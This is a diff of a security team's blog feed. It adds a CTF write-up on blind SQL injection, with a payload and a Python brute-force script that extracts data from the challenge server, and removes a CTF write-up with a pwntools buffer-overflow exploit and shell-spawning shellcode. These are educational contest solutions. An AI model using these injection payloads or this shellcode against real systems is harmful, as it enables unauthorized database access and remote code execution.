@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-12-04T04:45:09.329Z</updated>
+  <updated>2017-12-04T05:24:01.189Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -16,11 +16,50 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>[Web] TPCTF2017 - Management</title>
+    <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/"/>
+    <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-Management/</id>
+    <published>2017-12-04T05:20:20.000Z</published>
+    <updated>2017-12-04T05:24:01.189Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><br>Management<br>60<br><br>I’ve created a new website so you can do all your important management. It includes users, creating things, reading things, and… well, not much else. Maybe there’s a flag?<br><br>Second instance running at 52.90.229.46:8558<br><br>tpctf{san1t1z3_y0ur_1npu7s} is not the correct flag. Look harder ;)<br>Note: the flag format is flag{}, not the usual tpctf{}<br><br>Author: Kevin Higgs<br><br></blockquote>
+
+<p>Opening the website we can see we can choose the user:<br><a data-fancybox="gallery" href="https://i.imgur.com/z4dn6bc.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/z4dn6bc.png" alt=""><br></a></p>
+<p>After doing this its shown a new form where we could read/insert into the columns data from the table users from the current user:<br><a data-fancybox="gallery" href="https://i.imgur.com/vo6FqwU.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/vo6FqwU.png" alt=""><br></a><br>We can see which <strong>sql query</strong> is being executed:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="string">`1`</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">name</span> = <span class="string">'custom-kevin'</span>;Result: 1</div></pre></td></tr></table></figure>
+<p>It’s shown in the website! all inputs are being sanitized for the exception of the POST parameter number! I used Blind Sql injection to do this challenge (Boolean Based) the base payload I used was</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">1`=1, 1`=if((<span class="keyword">SELECT</span> <span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'Abc'</span>,<span class="number">1</span>,<span class="number">1</span>)))=<span class="keyword">hex</span>(<span class="keyword">substring</span>(<span class="string">'A'</span>,<span class="number">1</span>,<span class="number">1</span>)),<span class="string">`1`</span>, <span class="string">'False'</span>), <span class="string">`1</span></div></pre></td></tr></table></figure>
+<p>It’s important to use <code>HEX</code> function because substring is case insensitive and would return wrong queries if we didn’t use it, notice that what is going to be shown in the page is the result of the comparison we are making in the sql query so if the comparison is true our query will show in the page <strong>Result: 1</strong> if it’s false it will return <strong>Result: 0</strong>, doing this by hand is tedious so I wrote a python script to automate the stuff:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"></div><div class="line">url=<span class="string">'http://52.90.229.46:8558'</span></div><div class="line">TABLE_NAME = <span class="string">'SELECT hex(substring(table_name,1,%d)) FROM information_schema.tables WHERE table_schema=database() limit %d,1'</span></div><div class="line">SUBSTRING_HEX_NAME = <span class="string">"hex(substring('&#123;&#125;',1,&#123;&#125;))"</span></div><div class="line">USERS_NAME = <span class="string">'SELECT hex(substring(name,1,%d)) FROM users limit %d,1'</span></div><div class="line"></div><div class="line">name = <span class="string">''</span></div><div class="line">cookie = &#123;<span class="string">'user'</span>: <span class="string">'kevin'</span>&#125;</div><div class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">5</span>):</div><div class="line">    name = <span class="string">''</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>+<span class="number">1</span>):</div><div class="line">        stop = <span class="keyword">True</span></div><div class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> string.printable:</div><div class="line">            PAYLOAD = <span class="string">"1`=if((%s)=%s,`1`, 'False'),`9"</span> % (USERS_NAME%(i,j), SUBSTRING_HEX_NAME.format(name+l,i))<span class="comment">#SUBSTRING_NAME.format(name+l, i))</span></div><div class="line">            <span class="comment">#print PAYLOAD</span></div><div class="line">            r = requests.post(url, data=&#123;<span class="string">'number'</span>:<span class="string">'%s'</span>%PAYLOAD,<span class="string">'action'</span>:<span class="string">'Read'</span>, <span class="string">'value'</span>:<span class="string">''</span>&#125;, cookies=cookie, timeout=<span class="number">6</span>)</div><div class="line">            </div><div class="line">            <span class="keyword">if</span> <span class="string">'Result: 1'</span> <span class="keyword">in</span> r.text:</div><div class="line">                <span class="comment">#print '-----------------------------------'</span></div><div class="line">                name += l</div><div class="line">                <span class="keyword">print</span> name</div><div class="line">                stop = <span class="keyword">False</span></div><div class="line">                <span class="keyword">break</span></div><div class="line">        <span class="keyword">if</span> stop:        </div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="comment">#if(1=1,sleep(6),0)</span></div></pre></td></tr></table></figure>
+<p>Running it</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">$ python management.py </div><div class="line">f</div><div class="line">fl</div><div class="line">fla</div><div class="line">flag</div><div class="line">flag&#123;</div><div class="line">flag&#123;a</div><div class="line">flag&#123;aL</div><div class="line">flag&#123;aLW</div><div class="line">flag&#123;aLW4</div><div class="line">flag&#123;aLW4y</div><div class="line">flag&#123;aLW4ys</div><div class="line">flag&#123;aLW4ys_</div><div class="line">flag&#123;aLW4ys_E</div><div class="line">flag&#123;aLW4ys_ES</div><div class="line">flag&#123;aLW4ys_ESC</div><div class="line">flag&#123;aLW4ys_ESC4</div><div class="line">flag&#123;aLW4ys_ESC4P</div><div class="line">flag&#123;aLW4ys_ESC4PE</div><div class="line">flag&#123;aLW4ys_ESC4PE_</div><div class="line">flag&#123;aLW4ys_ESC4PE_3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3r</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rY</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYT</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1N</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!</div><div class="line">flag&#123;aLW4ys_ESC4PE_3v3rYTH1NG!!!!!&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;&lt;br&gt;Management&lt;br&gt;60&lt;br&gt;&lt;br&gt;I’ve created a new website so you can do all your important management. It includes users, creating 
+    
+    </summary>
+    
+      <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
+    
+    
+      <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
+    
+      <category term="sqli" scheme="https://teamrocketist.github.io/tags/sqli/"/>
+    
+      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
+    
+      <category term="blindSqli" scheme="https://teamrocketist.github.io/tags/blindSqli/"/>
+    
+  </entry>
+  
+  <entry>
     <title>[Web] TPCTF2017 - It&#39;s Common Sense</title>
     <link href="https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/"/>
     <id>https://teamrocketist.github.io/2017/12/04/Web-TPCTF2017-It-s-Common-Sense/</id>
     <published>2017-12-04T04:35:42.000Z</published>
-    <updated>2017-12-04T04:45:09.329Z</updated>
+    <updated>2017-12-04T05:21:02.874Z</updated>
     
     <content type="html"><![CDATA[<blockquote><br>It’s Common Sense<br>100<br><br>Common Sense Reviews was fixed last night. If you believe you had a working sol. last night but did not receive an email, please retry that solution. One major issue was email sending.<br><br>We found this site: Common Sense Reviews<br><br>We think the site owners are related to Pirates. Please retrieve the admin password.<br><br>This challenge is not working right now, it should be back soon. If not, we will remove points received from it.This challenge should be working properly now. Expect a delay in receiving emails (approx. 3 minutes max?).<br><br>Author: Steven Su<br><br></blockquote>
 
@@ -48,6 +87,8 @@
       <category term="passwordreset" scheme="https://teamrocketist.github.io/tags/passwordreset/"/>
     
       <category term="jquery" scheme="https://teamrocketist.github.io/tags/jquery/"/>
+    
+      <category term="tpctf2017" scheme="https://teamrocketist.github.io/tags/tpctf2017/"/>
     
   </entry>
   
@@ -954,47 +995,6 @@ d = []
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[Pwn] CSAW - Pilot</title>
-    <link href="https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/"/>
-    <id>https://teamrocketist.github.io/2017/09/18/Pwn-CSAW-Pilot/</id>
-    <published>2017-09-18T20:58:25.000Z</published>
-    <updated>2017-09-27T12:13:57.347Z</updated>
-    
-    <content type="html"><![CDATA[<blockquote><br>pilot<br><br>Can I take your order?<br><br>nc pwn.chal.csaw.io 8464<br><br>16:05 Eastern: Updated binary<br><br></blockquote>
-
-<p>Simple bufferoverflow , we actually have a read size of <code>0x40</code> stack the binary doesn’t have any kind of protections so it’s a very easy one, just a simple buffer overflow, we even get the buffer address to jump!</p>
-<p><img src="https://i.imgur.com/fA4rP6S.png" alt=""></p>
-<p>The plan is:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1 - Caculate the offset to overflow.</div><div class="line">2 - Extract the address of the buffer.</div><div class="line">3 - Insert nops at the beginning and then shell code, the rest of the buffer fill it with A or any other values</div><div class="line">4 - Modify the return address with the value of the beginning of the buffer</div></pre></td></tr></table></figure>
-<p>Visual representation of the stack!</p>
-<p><img src="https://i.imgur.com/sXg37RZ.png" alt=""></p>
-<p>How the stack looks like in gdb!</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/20g 0x7ffef1913660</div><div class="line">0x7ffef1913660:	0xbf48f63190909090	0xff978cd091969dd1  </div><div class="line">0x7ffef1913670:	0x573b04e6f7dff748	0x41414141050f5f54  </div><div class="line">0x7ffef1913680:	0x4141414141414141	0x00007ffef1913660</div></pre></td></tr></table></figure>
-<p>The offset is 40 bytes to overflow the code is very simple</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'pwn/pilot'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn.chal.csaw.io'</span>, <span class="number">8464</span>)</div><div class="line"> </div><div class="line">binary = ELF(<span class="string">'pwn/pilot'</span>)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"><span class="comment">#db.attach(r, '''</span></div><div class="line"><span class="comment">#break *0x0000000000400b35</span></div><div class="line"><span class="comment">#c''')</span></div><div class="line">r.recvuntil(<span class="string">'[*]Good Luck Pilot!....\n'</span>)</div><div class="line"></div><div class="line">nops = <span class="string">'\x90'</span>*<span class="number">4</span></div><div class="line">shellcode =  <span class="string">"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"</span></div><div class="line">padding = <span class="string">'A'</span>* (<span class="number">40</span> - len(nops)- len(shellcode)) </div><div class="line">BUFFER = int(r.recvline()[<span class="number">12</span>:],<span class="number">0</span>)</div><div class="line">log.info(<span class="string">"LEAKED BUFFER 0x%x"</span> % BUFFER)</div><div class="line"></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'[*]Command:'</span>)</div><div class="line">r.sendline(nops+ shellcode + padding+ p64(BUFFER))</div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
-<p>Running it</p>
-<figure class="highlight zsh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ python pilot.py</div><div class="line">[*] <span class="string">'~/ctf/csaw/pwn/pilot'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX disabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">    RWX:      Has RWX segments</div><div class="line">[+] Opening connection to pwn.chal.csaw.io on port 8464: Done</div><div class="line">[*] LEAKED BUFFER 0x7ffc2562d050</div><div class="line">[*] Switching to interactive mode</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">pilot</div><div class="line">$ cat flag</div><div class="line">flag&#123;1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys&#125;</div></pre></td></tr></table></figure>]]></content>
-    
-    <summary type="html">
-    
-      &lt;blockquote&gt;&lt;br&gt;pilot&lt;br&gt;&lt;br&gt;Can I take your order?&lt;br&gt;&lt;br&gt;nc pwn.chal.csaw.io 8464&lt;br&gt;&lt;br&gt;16:05 Eastern: Updated binary&lt;br&gt;&lt;br&gt;&lt;/blockquote
-    
-    </summary>
-    
-      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
-    
-    
-      <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
-    
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
-    
-      <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
     
   </entry>
   
